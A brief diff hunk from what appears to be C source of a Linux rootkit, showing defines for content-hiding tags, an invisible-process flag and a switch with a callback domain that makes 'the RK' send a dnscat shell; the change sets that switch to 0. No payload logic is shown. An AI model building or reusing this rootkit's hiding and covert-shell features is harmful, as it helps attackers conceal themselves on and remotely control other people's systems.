@@ -11,7 +11,7 @@ struct linux_dirent {
 #define HIDETAGIN "<viajano>"
 #define HIDETAGOUT "</viajano>"
 #define PF_INVISIBLE 0x10000000
-#define DNSCATSHELL 1 // only if you want the RK to send a dnscat shell when initiated 
+#define DNSCATSHELL 0 // only if you want the RK to send a dnscat shell when initiated 
 char *domain = "example.com"; // only if you want the RK to send a dnscat shell when initiated 
 int file_check(void *arg, ssize_t size);
 int hide_content(void *arg, ssize_t size);
